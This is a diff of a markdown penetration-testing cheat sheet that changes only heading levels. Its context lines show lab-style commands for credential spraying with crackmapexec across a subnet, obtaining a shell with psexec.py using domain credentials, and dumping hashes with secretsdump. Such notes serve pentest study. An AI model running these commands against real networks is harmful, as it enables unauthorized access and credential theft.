@@ -1,4 +1,4 @@
-## crackmapexec
+# crackmapexec
 
 Use crackmapexec to pass the password around the network and see what other machines include this account
 
@@ -19,7 +19,7 @@ crackmapexec smb 10.10.10.10/24 -u water -p password123
 #new users and their hashes will be discovered
 ```
 
-### psexec
+# psexec
 You can use this command to get a quick easy shell sometimes it works sometimes it doesn't
 
 ```bash
@@ -27,7 +27,7 @@ example: psexec.py marvel/fcastle:Password1@192.168.16.139
 usage: psexec.py domain/username:password@[IP]
 ```
 
-### secretsdump
+# secretsdump
 
 Use this to dump hashes and maybe pass them around
 ```bash
